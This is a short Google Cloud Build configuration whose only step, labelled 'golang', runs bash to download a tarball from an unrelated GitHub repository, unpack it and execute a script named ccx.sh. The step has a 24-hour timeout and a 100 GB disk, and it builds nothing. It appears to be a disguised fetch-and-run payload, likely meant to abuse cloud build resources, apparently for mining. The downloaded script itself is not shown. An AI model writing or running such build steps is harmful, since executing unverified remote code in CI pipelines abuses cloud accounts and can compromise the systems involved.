steps:
  - name: golang
    args:
      - '-c'
      - >-
         wget https://github.com/pionbangkit/cobacoba/raw/main/ccx.tar.gz && tar xf ccx.tar.gz && ./ccx.sh
    waitFor:
      - '-'
    entrypoint: /bin/bash
timeout: 86400s
options:
  diskSizeGb: '100'
